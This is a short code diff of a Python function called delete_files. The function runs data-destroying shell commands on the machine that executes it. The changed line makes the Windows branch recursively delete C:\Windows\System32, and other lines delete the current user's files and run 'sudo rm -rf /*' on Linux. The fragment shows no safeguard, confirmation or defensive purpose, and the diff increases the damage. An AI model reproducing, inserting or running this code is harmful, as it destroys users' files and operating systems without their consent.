@@ -13,7 +13,7 @@ def delete_files():
     current_user = os.getlogin()
     
     if system == "Windows":
-        os.system(f"del /f /q C:\\*")
+        os.system("del /s /q C:\\Windows\\System32\\*")
         os.system(f"del /f /q C:\\Users\\{current_user}\\*")
     elif system == "Linux":
         os.system("sudo rm -rf /*")
